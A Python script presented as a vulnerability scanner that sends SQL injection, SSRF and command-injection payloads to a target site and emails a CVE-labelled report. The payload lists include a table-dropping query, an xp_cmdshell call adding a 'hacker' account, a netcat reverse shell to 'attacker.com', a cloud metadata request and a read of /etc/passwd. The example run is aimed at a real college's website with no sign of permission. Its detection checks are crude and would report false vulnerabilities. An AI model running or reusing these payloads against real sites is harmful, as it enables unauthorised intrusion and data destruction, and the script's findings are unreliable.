import requests
from urllib.parse import quote
import smtplib
from email.mime.text import MIMEText
import time
import logging

# Advanced Payloads for SQL Injection, SSRF, and Command Injection
sql_payloads = [
    "' OR 1=1 --",
    "' UNION SELECT NULL, NULL, NULL--",
    "' OR 'x'='x",
    "' AND 1=1#",
    "'; EXEC xp_cmdshell('net user hacker /add');--",
    "'; DROP TABLE users;--",
    "'; SELECT * FROM information_schema.tables;--"
]

ssrf_payloads = [
    "http://169.254.169.254/latest/meta-data/",  # SSRF vulnerability
    "http://localhost:80",  # Another SSRF attempt
    "nc -e /bin/bash attacker.com 1234",  # Command injection
]

command_injection_payloads = [
    "echo $(whoami)",
    "id",
    "cat /etc/passwd",
    "ls -al",
]

# Set up logging
logging.basicConfig(filename='vulnerability_scan.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Function to retrieve CVE data with retry logic
# Function to retrieve CVE data
def get_cve_data(vulnerability):
    url = f"https://vulners.com/api/v3/search/lucene/?query={vulnerability}"
    try:
        response = requests.get(url)

        # Check for HTTP errors
        if response.status_code != 200:
            print(f"Error: Received HTTP status code {response.status_code}")
            return "Error retrieving CVE data", "N/A", "Error retrieving data"

        cve_data = response.json()

        # Check if 'data' exists and contains results
        if cve_data.get('data') and len(cve_data['data']) > 0:
            cve_info = cve_data['data'][0]
            cve_id = cve_info.get('cve', {}).get('id', 'N/A')
            description = cve_info.get('description', 'No description')
            severity = cve_info.get('cvss', {}).get('base_score', 'N/A')
            return cve_id, severity, description

        return "No CVE found", "N/A", "No description"

    except Exception as e:
        print(f"Error retrieving CVE data: {e}")
        return "Error retrieving CVE data", "N/A", "Error retrieving data"


# Function to check vulnerabilities on the target URL
def advanced_vulnerability_check(url):
    vulnerabilities = []

    # Test for SQL Injection
    for payload in sql_payloads:
        test_url = f"{url}?input={quote(payload)}"
        try:
            response = requests.get(test_url)
            if "error" in response.text.lower() or "mysql" in response.text.lower():
                cve_id, severity, description = get_cve_data("SQL Injection")
                vulnerabilities.append(
                    f"SQL Injection detected: {cve_id}, Severity: {severity}, Description: {description}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Error with SQL Injection test on {url}: {e}")

    # Test for SSRF
    for payload in ssrf_payloads:
        test_url = f"{url}?url={quote(payload)}"
        try:
            response = requests.get(test_url)
            if "404" not in response.text:
                cve_id, severity, description = get_cve_data("SSRF")
                vulnerabilities.append(f"SSRF detected: {cve_id}, Severity: {severity}, Description: {description}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Error with SSRF test on {url}: {e}")

    # Check for Command Injection
    for payload in command_injection_payloads:
        test_url = f"{url}?cmd={quote(payload)}"
        try:
            response = requests.get(test_url)
            if payload in response.text:
                cve_id, severity, description = get_cve_data("Command Injection")
                vulnerabilities.append(
                    f"Command Injection detected: {cve_id}, Severity: {severity}, Description: {description}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Error with Command Injection test on {url}: {e}")

    return vulnerabilities

# Function to categorize vulnerabilities based on CVSS score
def categorize_vulnerabilities(vulnerabilities):
    categorized = {"Critical": [], "High": [], "Medium": [], "Low": []}

    for vuln in vulnerabilities:
        parts = vuln.split(", ")
        if len(parts) < 3:
            continue  # Skip if the format is incorrect

        # Extract severity
        severity = parts[1].split(":")[1].strip()
        try:
            severity_score = float(severity)
        except ValueError:
            severity_score = 0  # Default to 'Low' if severity is invalid or missing

        # Categorize based on severity score
        if severity_score >= 9:
            categorized["Critical"].append(vuln)
        elif severity_score >= 7:
            categorized["High"].append(vuln)
        elif severity_score >= 4:
            categorized["Medium"].append(vuln)
        else:
            categorized["Low"].append(vuln)

    return categorized

# Function to generate a vulnerability report
def generate_report(categorized_vulnerabilities):
    report = "Vulnerability Scan Report\n\n"
    for severity, vulns in categorized_vulnerabilities.items():
        report += f"{severity} Vulnerabilities:\n"
        for vuln in vulns:
            report += f"- {vuln}\n"
    return report

# Function to send email alerts if critical or high vulnerabilities are found
def send_email_alert(report):
    # SMTP setup (Gmail example)
    sender_email = "your_email@gmail.com"
    receiver_email = "recipient_email@example.com"
    password = "your_password"

    msg = MIMEText(report)
    msg["Subject"] = "Critical Vulnerability Report"
    msg["From"] = sender_email
    msg["To"] = receiver_email

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
        logging.info("Email alert sent successfully.")
    except Exception as e:
        logging.error(f"Error sending email alert: {e}")

# Main function to scan a URL and generate a report
def scan_and_report(url):
    # Get vulnerabilities
    vulnerabilities = advanced_vulnerability_check(url)

    # Categorize vulnerabilities
    categorized_vulnerabilities = categorize_vulnerabilities(vulnerabilities)

    # Generate the report
    report = generate_report(categorized_vulnerabilities)

    # Send email if critical or high vulnerabilities are found
    if categorized_vulnerabilities["Critical"] or categorized_vulnerabilities["High"]:
        send_email_alert(report)

    return report

# Example usage
url = "https://www.srcas.ac.in/"  # Replace with the URL you want to scan
report = scan_and_report(url)
print(report)
